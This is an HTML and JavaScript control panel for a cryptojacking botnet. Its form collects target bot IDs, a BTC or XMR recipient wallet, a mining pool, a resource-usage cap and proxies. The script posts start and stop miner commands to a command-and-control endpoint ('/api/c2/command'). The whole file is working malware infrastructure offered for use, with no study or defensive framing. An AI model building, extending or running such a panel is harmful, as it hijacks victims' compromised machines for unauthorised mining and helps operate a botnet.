<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Miner Control</title>
    <link rel="stylesheet" href="../GUI-style.css">
</head>
<body>
    <h1>Cryptocurrency Miner</h1>
    <div class="panel">
        <h2>Parameters</h2>
        <input type="text" id="targets" placeholder="Target bot IDs (comma separated)">
        <select id="token_name">
            <option value="btc">Bitcoin (BTC)</option>
            <option value="xmr">Monero (XMR)</option>
        </select>
        <input type="text" id="recipient_address" placeholder="Recipient Address">
        <input type="text" id="pool" placeholder="Pool Address">
        <input type="number" id="resource_use_cap" placeholder="Resource Usage Cap (%)">
        <input type="text" id="proxies" placeholder="Proxies (optional)">
        <button onclick="prepareStartMiner()">Start Miner</button>
        <button onclick="stopMiner()">Stop Miner</button>
    </div>
    <div class="panel">
        <h2>Output</h2>
        <div id="output"></div>
    </div>
    <div id="popup" class="popup hidden">
        <div class="popup-content">
            <p id="popup-message"></p>
            <button onclick="closePopup()">Close</button>
        </div>
    </div>
    <div id="run-popup" class="popup hidden">
        <div class="popup-content">
            <h3>Prepare to Run</h3>
            <p id="run-popup-message"></p>
            <p id="run-popup-feedback"></p>
            <button onclick="triggerRunFromPopup()">Run</button>
            <button onclick="closeRunPopup()">Cancel</button>
        </div>
    </div>
    <script>
        const popup = document.getElementById('popup');
        const popupMessage = document.getElementById('popup-message');
        const runPopup = document.getElementById('run-popup');
        const runPopupMessage = document.getElementById('run-popup-message');
        const runPopupFeedback = document.getElementById('run-popup-feedback');
        let pendingRunAction = null;

        function showPopup(message, isError = false) {
            popupMessage.textContent = message;
            popup.classList.remove('hidden');
            popup.classList.toggle('error', isError);
        }

        function closePopup() {
            popup.classList.add('hidden');
            popup.classList.remove('error');
        }

        function openRunPopup(message, action) {
            pendingRunAction = action;
            runPopupMessage.textContent = message || 'Click Run to execute this command.';
            runPopupFeedback.textContent = '';
            runPopup.classList.remove('hidden');
        }

        function closeRunPopup() {
            runPopup.classList.add('hidden');
            pendingRunAction = null;
        }

        function triggerRunFromPopup() {
            if (typeof pendingRunAction === 'function') {
                const timestamp = new Date().toLocaleTimeString();
                runPopupFeedback.textContent = 'Run button clicked at ' + timestamp + '.';
                alert('Run button clicked at ' + timestamp + '.');
                const action = pendingRunAction;
                closeRunPopup();
                action();
            }
        }

        function prepareStartMiner() {
            openRunPopup('Ready to start the miner module.', startMiner);
        }

        function parseTargets() {
            return document.getElementById('targets').value
                .split(',')
                .map(v => v.trim())
                .filter(Boolean);
        }

        function dispatchMinerCommand(body) {
            const targets = parseTargets();
            if (!targets.length) {
                showPopup('Please specify at least one target bot ID.', true);
                return;
            }

            fetch('/api/c2/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    targets,
                    command: JSON.stringify(body),
                }),
            })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'ok') {
                        showPopup('Miner command queued for ' + targets.join(', '));
                    } else {
                        showPopup('C2 rejected command: ' + (data.message || 'unknown error'), true);
                    }
                })
                .catch(err => showPopup('Failed to send command: ' + err, true));
        }

        function startMiner() {
            const resourceCap = parseInt(document.getElementById('resource_use_cap').value, 10);
            const body = {
                module: 'miner',
                action: 'start',
                params: {
                    recipient_address: document.getElementById('recipient_address').value,
                    resource_use_cap: Number.isNaN(resourceCap) ? null : resourceCap,
                    pool: document.getElementById('pool').value,
                    proxies: document.getElementById('proxies').value,
                    token_name: document.getElementById('token_name').value,
                },
            };

            if (!body.params.recipient_address || !body.params.pool) {
                showPopup('Recipient and pool addresses are required.', true);
                return;
            }

            dispatchMinerCommand(body);
        }

        function stopMiner() {
            const body = {
                module: 'miner',
                action: 'stop',
                params: {
                    token_name: document.getElementById('token_name').value,
                },
            };
            dispatchMinerCommand(body);
        }
    </script>
</body>
</html>
